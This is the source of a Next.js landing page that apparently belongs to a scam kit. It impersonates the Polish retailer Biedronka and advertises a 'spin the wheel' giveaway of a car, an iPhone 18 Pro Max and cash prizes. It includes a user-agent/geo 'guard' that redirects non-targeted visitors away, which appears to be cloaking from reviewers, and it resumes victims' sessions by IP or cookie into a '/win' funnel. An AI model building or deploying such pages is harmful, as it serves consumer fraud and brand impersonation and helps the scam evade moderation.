import { redirect } from "next/navigation";
import { headers } from "next/headers";
import { findResumableSession } from "@/lib/session-resume";
import { stepToPath } from "@/lib/session-routes";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { buildShareMetadata } from "@/lib/share-metadata";
import type { SessionStep } from "@/types/session";
import LandingShell from "./landing-shell";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "Biedronka — Poznaj nagrody w naszej akcji!",
    description:
      "Weź udział w akcji Biedronka! Zakręć kołem i wygraj samochód na rok, iPhone 18 Pro Max lub nagrody pieniężne.",
    canonical: "/",
  });
}

type Props = {
  searchParams?: Promise<{ session?: string | string[] }>;
};

export default async function Home({ searchParams }: Props) {
  // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
  {
    const h = await headers();
    const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
    if (blockedUrl) redirect(blockedUrl);
  }

  const sp = (await searchParams) ?? {};
  const rawSession = Array.isArray(sp.session) ? sp.session[0] : sp.session;
  const sid =
    typeof rawSession === "string" && rawSession.trim() !== ""
      ? rawSession.trim()
      : null;

  if (!sid) {
    // Session parametresi YOK: IP/cookie bazli resume — kullanici kaldigi yerden devam eder.
    const resumed = await findResumableSession(true);
    if (resumed) {
      const routeId =
        resumed.public_id != null && String(resumed.public_id).trim() !== ""
          ? String(resumed.public_id)
          : resumed.id;
      redirect(
        stepToPath((resumed.current_step || "wheel") as SessionStep, resumed.id, routeId),
      );
    }
  }

  // Her durumda landing: CTA -> session olusur -> /win?session=...
  return <LandingShell />;
}
